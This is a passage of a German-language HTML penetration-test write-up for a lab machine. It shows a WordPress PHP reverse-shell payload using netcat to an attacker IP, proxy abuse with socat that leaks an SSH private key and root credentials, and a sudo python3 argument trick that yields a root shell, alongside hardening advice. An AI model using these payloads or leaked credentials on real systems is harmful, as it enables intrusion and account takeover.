+                 **Empfehlung (Admin):** Das schwache Passwort `fuckit!` für `umeko` sofort ändern. Passwortrichtlinien durchsetzen. Den fehlgeschlagenen Crack für `admin` nicht als Sicherheit werten; das Passwort könnte mit einer größeren Liste oder anderen Regeln knackbar sein - es sollte ebenfalls geändert werden.
+            </p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (POC - WordPress RCE)</h2>
+             <p class="analysis">
+                 **Analyse:** Nach dem Login als `umeko` (Passwort `fuckit!`) wird eine Schwachstelle in einem (nicht namentlich genannten, aber implizierten) "shortcode Plugin" ausgenutzt, um Remote Code Execution zu erlangen.
+                 1.  Ein neuer Post oder eine Seite wird erstellt/bearbeitet.
+                 2.  Der Autor wird auf `admin` geändert (impliziert, dass `umeko` diese Rechte hat, was ungewöhnlich ist, oder dass `admin` doch kompromittiert wurde - das Log ist hier unklar).
+                 3.  Der Code-Editor wird aktiviert.
+                 4.  Ein PHP-Reverse-Shell-Payload wird innerhalb eines Shortcode-Tags (`[php]...[/php]`) eingefügt. Der Payload verbindet sich zur Angreifer-IP `192.168.2.199` auf Port `4444`. *Anmerkung: Die IP `192.168.2.199` weicht von der vorherigen Angreifer-IP (`192.168.2.140`) ab.*
+                 5.  Der Post/die Seite wird veröffentlicht ("Publish").
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">
+# Payload in WordPress Post/Page Editor:
+[php]
+<?php system('nc -e /bin/bash 192.168.2.199 4444'); ?>
+[/php]</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="evaluation">
+                 **Bewertung:** Dies ist ein klassischer Weg, um über eine WordPress-Admin-Session RCE zu erlangen, wenn ein verwundbares Plugin oder Theme das Ausführen von PHP über Shortcodes oder eine ähnliche Funktion erlaubt. Die Möglichkeit, den Autor zu ändern, ist ein zusätzlicher Faktor, der untersucht werden sollte.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Einen Netcat-Listener auf `192.168.2.199:4444` starten, bevor der Post veröffentlicht wird. Nach dem Veröffentlichen die URL des Posts/der Seite aufrufen, um den Payload zu triggern.<br>
+                 **Empfehlung (Admin):** Das verwundbare "shortcode Plugin" identifizieren und entfernen/updaten. Die Möglichkeit, beliebigen PHP-Code über die WordPress-Oberfläche auszuführen (z.B. via Plugin-/Theme-Editor oder unsichere Shortcodes), deaktivieren (`DISALLOW_FILE_EDIT` in `wp-config.php`). Benutzerrechte überprüfen (darf `umeko` Beiträge als `admin` veröffentlichen?).
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+<span class="comment"># Warten auf Verbindung nach dem Veröffentlichen des Posts...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.118] 59744</span>
+<span class="prompt">www-data@tiny:/var/www/html$</span> <span class="comment"># Shell als www-data erhalten!</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Netcat-Listener empfängt die Verbindung vom Zielserver (`192.168.2.118`), nachdem der WordPress-Post veröffentlicht und vermutlich aufgerufen wurde. Die Shell läuft als Benutzer `www-data`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Initial Access als `www-data` erfolgreich über WordPress RCE erreicht.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Shell stabilisieren, Enumeration als `www-data` starten.<br>
+                 **Empfehlung (Admin):** WordPress-Installation bereinigen, Schwachstelle beheben.
+             </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <h3 id="privesc-www-data-enum">Enumeration als www-data</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@tiny:/var/www/html$ <span class="command">head -n 30 wp-config.php</span></div>
+                     <pre>
+ php
+[...]
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', '<span class="command">wordpressdb</span>' );
+
+/** Database username */
+define( 'DB_USER', '<span class="command">wordpressuser</span>' );
+
+/** Database password */
+define( 'DB_PASSWORD', '<span class="password">6rt443RKhwTXjWDe</span>' );
+[...]
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Die WordPress-Konfigurationsdatei `wp-config.php` wird gelesen. Sie enthält die Zugangsdaten für die MySQL/MariaDB-Datenbank: Benutzer `wordpressuser`, Passwort `6rt443RKhwTXjWDe`, Datenbank `wordpressdb`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Wichtiger Fund. Diese Datenbank-Credentials könnten möglicherweise für andere Dienste oder Benutzer wiederverwendet werden oder direkten Zugriff auf die Datenbank ermöglichen (falls `www-data` sich verbinden kann).
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@tiny:/var/www/html$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] password for www-data: <span class="password"># Passwort unbekannt</span>
+sudo: a password is required
+                     </pre>
+                     <div class="prompt">www-data@tiny:/var/www/html$ <span class="command">ls /home/</span></div>
+                      <pre>vic</pre>
+                      <div class="prompt">www-data@tiny:/var/www/html$ <span class="command">cd /home/vic/</span></div>
+                      <pre><span class="password">bash: cd: /home/vic/: Permission denied</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `sudo -l` scheitert, da das Passwort für `www-data` nicht bekannt ist. Im `/home`-Verzeichnis gibt es nur den Benutzer `vic`. `www-data` hat keine Berechtigung, in `vic`s Home-Verzeichnis zu wechseln.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@tiny:/var/www/html$ <span class="command">find / -perm -4000 -ls 2>/dev/null</span></div>
+                      <pre>
+   914041     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
+   914042     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
+   957212    276 -rwsr-xr-x   1 root     root       281624 Jun 27 13:45 /usr/bin/sudo
+   917500     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
+   914039     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
+   918251     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su
+   917654     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount
+   914038     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
+   917656     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount
+   929606     52 -rwsr-xr--   1 root     messagebus    51272 Feb  8  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   931821    640 -rwsr-xr-x   1 root     root         653888 Feb  8  2023 /usr/lib/openssh/ssh-keysign
+                     </pre>
+                     <div class="prompt">www-data@tiny:/var/www/html$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre>/usr/bin/ping cap_net_raw=ep</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Die Suche nach SUID-Binaries und Capabilities liefert nur Standardergebnisse ohne offensichtlichen Exploit-Vektor für `www-data`.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Keine direkten PrivEsc-Möglichkeiten über SUID/Capabilities für `www-data` gefunden. Der Fokus muss auf anderen Wegen liegen, z.B. Ausnutzung des tinyproxy oder Finden von Credentials für `vic`.
+            </p>
+
+            <h3 id="privesc-proxy-bypass">Proxy Bypass & SSH Key Leak (vic)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@tiny:/var/www/html$ <span class="command">cat /etc/tinyproxy/tinyproxy.conf | grep -v '#' | grep .</span></div>
+                     <pre>
+User tinyproxy
+Group tinyproxy
+Port 8888
+Timeout 600
+DefaultErrorFile "/usr/share/tinyproxy/default.html"
+StatFile "/usr/share/tinyproxy/stats.html"
+LogFile "/var/log/tinyproxy/tinyproxy.log"
+LogLevel Info
+PidFile "/run/tinyproxy/tinyproxy.pid"
+<span class="command">Upstream http localhost:1111</span>
+MaxClients 100
+<span class="command">Allow 127.0.0.1</span>
+Allow ::1
+Allow 192.168.0.30
+ViaProxyName "tinyproxy"
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Die Konfigurationsdatei von tinyproxy wird gelesen. Wichtige Punkte:
+                *   Der Proxy läuft auf Port 8888.
+                *   Erlaubt sind Zugriffe von `127.0.0.1`, `::1` und `192.168.0.30`.
+                *   **Kritisch:** Es gibt eine `Upstream`-Direktive, die den Proxy anweist, Anfragen an `http localhost:1111` weiterzuleiten. Dies bedeutet, der Proxy fungiert als Reverse Proxy oder Gateway zu einem Dienst, der nur auf localhost Port 1111 lauscht.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die `Upstream`-Konfiguration ist der Schlüssel. Indem man eine Anfrage *durch* den Proxy auf Port 8888 sendet, kann man den Dienst erreichen, der *eigentlich* nur auf `localhost:1111` lauscht. Da der Proxy selbst von `127.0.0.1` erreichbar ist, kann `www-data` diesen Mechanismus ausnutzen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Listener auf 1111, um die Upstream-Anfrage abzufangen -->
+                     <div class="prompt">www-data@tiny:/var/www/html$ <span class="command">nc -lvnp 1111</span></div>
+                     <pre>
+listening on [any] 1111 ...
+<span class="password">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37724</span>
+<span class="command">GET http://127.0.0.1:8000/id_rsa HTTP/1.1</span>
+Host: 127.0.0.1:8000
+Connection: close
+Via: 1.1 tinyproxy (tinyproxy/1.11.1)
+<span class="command">Authorization: Basic cm9vdDpRMlg0XQ0V2pz</span> <span class="comment"># base64(root:Q2X4]5Vjs)</span>
+User-Agent: curl/7.88.1
+Accept: */*
+
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** `www-data` startet einen Netcat-Listener auf Port 1111, um die Anfrage abzufangen, die vom tinyproxy (Port 8888) an seinen Upstream (`localhost:1111`) gesendet wird. Eine Anfrage kommt an:
+                 *   Methode: GET
+                 *   Ziel: `http://127.0.0.1:8000/id_rsa`. Dies ist die *ursprüngliche* URL, die der Client an den Proxy (Port 8888) gesendet hat. Der Upstream-Eintrag in tinyproxy.conf ist irreführend oder wird hier nicht korrekt angewendet/interpretiert. Der Proxy scheint die Anfrage einfach an `localhost:1111` weiterzuleiten, aber der *Inhalt* der Anfrage zielt auf `127.0.0.1:8000`.
+                 *   Authentifizierung: Ein Basic-Auth-Header ist vorhanden: `Authorization: Basic cm9vdDpRMlg0XQ0V2pz`. Dekodiert ergibt dies `root:Q2X4]5Vjs`.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Der Versuch, den Upstream-Dienst zu verstehen, deckt stattdessen eine andere interessante Information auf: Eine Anfrage, die *durch* den Proxy geht, versucht, `/id_rsa` von einem lokalen Dienst auf Port 8000 mit den Credentials `root:Q2X4]5Vjs` abzurufen. Dies deutet auf einen internen Prozess oder einen anderen Benutzer hin, der versucht, auf diesen Schlüssel zuzugreifen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@tiny:/tmp$ <span class="command">socat -v tcp-listen:1111 tcp:localhost:8000</span></div>
+                     <pre>
+<span class="comment">> 2023/12/08 17:13:01 [...] length=84 from=0 to=83</span>
+GET http://127.0.0.1:8000/id_rsa HTTP/1.1\r
+Host: 127.0.0.1:8000\r
+[...]
+Via: 1.1 tinyproxy (tinyproxy/1.11.1)\r
+Authorization: Basic cm9vdDpRMlg0XQ0V2pz\r
+[...]
+<span class="comment">< 2023/12/08 17:13:01 [...] length=2851 from=0 to=2850</span>
+HTTP/1.1 200 OK\r
+Server: nginx/1.22.1\r
+[...]
+Content-Type: application/octet-stream\r
+Content-Length: 2602\r
+[...]
+\r
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+[...]
+Rfyuuzx5QjqBAAAAwDZTWnAXApcfvHYZ8hP6zGQybXKbVRW7SgSPjI0rJSvVsoIm/L0NNn
+[...]
+6IpIiHLRZcy1a50/UAAAARbWlsb3VAcGVybG1hbi5obXYBAg <span class="comment"># Schlüssel für milou@perlman.hmv ? (Falsche VM im Kommentar?)</span>
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `socat` wird verwendet, um eine Verbindung auf Port 1111 zu öffnen und sie an `localhost:8000` weiterzuleiten. Dies dient dazu, die ursprüngliche Anfrage (die an den Proxy auf 8888 ging und dann von tinyproxy an 1111 weitergeleitet werden sollte) an den eigentlichen Zieldienst auf Port 8000 zu schicken.
+                1.  Die eingehende Anfrage (vermutlich `curl -x http://127.0.0.1:8888 http://127.0.0.1:8000/id_rsa -u root:Q2X4]5Vjs`) wird von tinyproxy empfangen, an `localhost:1111` (wo socat lauscht) weitergeleitet.
+                2.  `socat` leitet die Anfrage an `localhost:8000` weiter.
+                3.  Der Dienst auf Port 8000 (identifiziert als nginx/1.22.1) antwortet mit "200 OK" und liefert einen privaten SSH-Schlüssel. Der Kommentar im Schlüssel `milou@perlman.hmv` ist verwirrend und passt nicht zur aktuellen VM "Tiny". Es ist wahrscheinlicher, dass dies der Schlüssel für den Benutzer `vic` auf `tiny.hmv` ist.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Durch die Kombination aus Proxy-Konfiguration und einem lokalen Dienst, der SSH-Schlüssel ausliefert (möglicherweise unsicher konfiguriert oder Teil eines Backups), konnte der private SSH-Schlüssel des Benutzers `vic` extrahiert werden. Die Basic-Auth-Credentials (`root:Q2X4]5Vjs`) waren notwendig, um auf den Dienst auf Port 8000 zuzugreifen.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Den extrahierten privaten Schlüssel speichern, Berechtigungen anpassen und versuchen, sich als `vic` per SSH anzumelden.<br>
+                 **Empfehlung (Admin):**
+                 1.  Den Dienst auf `localhost:8000` untersuchen und absichern. Er sollte keine privaten SSH-Schlüssel ausliefern und eine sichere Authentifizierung verwenden (nicht Basic Auth mit schwachem Passwort).
+                 2.  Die tinyproxy-Konfiguration überprüfen. Die `Upstream`-Direktive ist ungewöhnlich und sollte entfernt werden, wenn sie nicht benötigt wird. Den Zugriff auf den Proxy generell einschränken.
+                 3.  Das Passwort für `root` (`Q2X4]5Vjs`) sofort ändern.
+                 4.  Den SSH-Schlüssel für `vic` als kompromittiert betrachten und austauschen.
+             </p>
+
+            <h3 id="privesc-vic-shell">Shell als vic</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Angreifer-Maschine -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh vic@192.168.2.118 -i idrsa</span></div> <span class="comment"># Annahme: Key wurde als idrsa gespeichert</span>
+                     <pre>
+Linux tiny.hmv 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64
+[...]
+[oh-my-zsh] Would you like to update? [Y/n] y
+Updating Oh My Zsh
+[...]
+Hooray! Oh My Zsh has been updated!
+[...]
+<span class="prompt">╭─vic@tiny ~ </span>
+<span class="prompt">╰─$</span> <span class="comment"># Erfolgreich als vic angemeldet (Zsh Shell)</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Mit dem über den Proxy-Bypass extrahierten privaten Schlüssel (`idrsa`) wird erfolgreich eine SSH-Verbindung als Benutzer `vic` zum Zielsystem hergestellt. Der Benutzer `vic` verwendet die Zsh-Shell mit Oh My Zsh.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Erfolgreiche Eskalation von `www-data` zu `vic`.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Als `vic` weiter enumerieren, insbesondere `sudo -l`.<br>
+                **Empfehlung (Admin):** Kompromittierten SSH-Schlüssel für `vic` austauschen. Den lokalen Dienst auf Port 8000 und den tinyproxy absichern.
+            </p>
+
+            <h3 id="privesc-root-carpy">POC: Eskalation zu root (sudo car.py)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">╭─vic@tiny ~ 
+╰─$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for vic on tiny:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User vic may run the following commands on tiny:
+    <span class="command">(ALL : ALL) NPASSWD: /usr/bin/python3 /opt/car.py*</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** `sudo -l` als `vic` zeigt, dass dieser Benutzer `/usr/bin/python3` mit dem Skript `/opt/car.py` und beliebigen nachfolgenden Argumenten (`*`) als root (`ALL : ALL`) ohne Passwort (`NOPASSWD`) ausführen darf.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Dies ist ein extrem gefährliches `sudo`-Recht. Es erlaubt die Ausführung von Python3 als root und, noch wichtiger, das Übergeben von beliebigen Argumenten an das Skript `/opt/car.py`. Selbst wenn `car.py` harmlos ist, kann die Fähigkeit, Python3 als root auszuführen und Argumente zu übergeben, oft zur Codeausführung missbraucht werden (z.B. durch Library Hijacking oder Ausnutzen von Modulimporten). Die hier verwendete Technik nutzt die Modulhierarchie, um auf `os.system` zuzugreifen.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Die `sudo`-Regel ausnutzen, indem eine Payload über die Argumente eingeschleust wird, die Python veranlasst, eine Root-Shell zu starten (siehe GTFOBins für Python mit sudo).<br>
+                **Empfehlung (Admin):** Diese `sudo`-Regel **sofort entfernen**. Niemals erlauben, Interpreter wie `python3` direkt über `sudo` auszuführen, schon gar nicht mit beliebigen Argumenten und ohne Passwort. Wenn ein Skript als root laufen muss, sollte es sorgfältig geprüft und gehärtet sein, und die `sudo`-Regel sollte nur die Ausführung dieses spezifischen Skripts *ohne* zusätzliche Argumente erlauben (oder nur sehr streng validierte Argumente).
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">╭─vic@tiny ~ 
+╰─$ <span class="command">sudo /usr/bin/python3 /opt/car.py __init__.__globals__.random._os.system /bin/bash</span></div>
+                     <pre>
+<span class="prompt">root@tiny:/home/vic#</span> id
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** Der `sudo`-Befehl wird mit einer speziellen Argumentenkette ausgeführt:
+                 *   `/opt/car.py`: Das erlaubte Skript (dessen Inhalt irrelevant ist).
+                 *   `__init__.__globals__.random._os.system`: Dies ist der erste Teil des Payloads. Er navigiert durch die Python-Modulhierarchie, um auf das `os`-Modul zuzugreifen, das durch das (wahrscheinlich importierte) `random`-Modul erreichbar ist. Ziel ist die `system`-Funktion.
+                 *   `/bin/bash`: Dies ist das zweite Argument, das an die gefundene `os.system`-Funktion übergeben wird.
+                 Python führt dies aus: Es interpretiert `/opt/car.py`. Das erste Argument `__init__.__globals__.random._os.system` wird als Objekt behandelt und Python löst es zur `os.system`-Funktion auf. Das zweite Argument `/bin/bash` wird dann an diese Funktion übergeben, was `os.system('/bin/bash')` als root ausführt und eine Root-Shell startet. Der `id`-Befehl bestätigt `uid=0`.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Privilege Escalation zu Root erfolgreich abgeschlossen durch cleveren Missbrauch der unsicheren `sudo`-Regel für Python.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Root-Flag und User-Flag lesen.<br>
+                **Empfehlung (Admin):** Die `sudo`-Regel entfernen. Das Prinzip der geringsten Rechte strikt anwenden.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@tiny:/home/vic# <span class="command">cd ~</span></div> <span class="comment"># Wechselt nach /root</span>
+                     <div class="prompt">root@tiny:~# <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt">root@tiny:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">0785ded6dbb7e73959924ad06152eabc</span></pre>
+                     <div class="prompt">root@tiny:~# <span class="command">cat /home/vic/user.txt</span></div>
+                     <pre><span class="password">7d9b0f6638734dbb10545f446c04a42b</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** Als `root` werden die Root-Flag (`/root/root.txt`) und die User-Flag (`/home/vic/user.txt`) erfolgreich gelesen.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Beide Flags wurden erfolgreich erbeutet. Das Ziel ist erreicht.
+            </p>
+
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/vic/user.txt</div> <!-- Pfad aus Shell-Kontext übernommen -->
+                     <div class="flag-value"><span class="password">7d9b0f6638734dbb10545f446c04a42b</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div> <!-- Pfad aus ls übernommen -->
+                     <div class="flag-value"><span class="password">0785ded6dbb7e73959924ad06152eabc</span></div>
+                 </div>
+             </div>
+         </section>
+
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Logs extrahiert -->
+        <p>Berichtsdatum: 8. Dezember 2023</p> <!-- Datum vom Nmap/Nikto/John Scan übernommen -->
+    </footer>
+</body>
+</html>
